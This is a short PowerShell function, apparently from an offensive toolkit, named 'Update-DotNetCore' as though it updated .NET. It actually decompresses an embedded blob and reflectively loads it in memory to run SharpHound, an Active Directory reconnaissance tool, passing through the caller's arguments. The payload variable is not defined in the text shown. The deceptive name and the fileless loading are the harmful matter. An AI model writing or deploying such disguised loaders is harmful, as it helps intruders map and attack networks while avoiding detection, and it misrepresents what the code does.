function Update-DotNetCore(){
    param (
       [Parameter(Mandatory=$true)] [String] $Arguments
    )
	$Inflated = New-Object IO.Compression.GzipStream($Data,[IO.Compression.CompressionMode]::Decompress)
	$Stream = New-Object System.IO.MemoryStream
	$Inflated.CopyTo( $Stream )
	[byte[]] $StreamArray = $Stream.ToArray()
	$Result = [Reflection.Assembly]::Load($StreamArray)
    Write-Output $Result.GetType("Sharphound.Program").GetMethod("InvokeSharpHound").Invoke($Null,@(,"$Arguments".split()))
}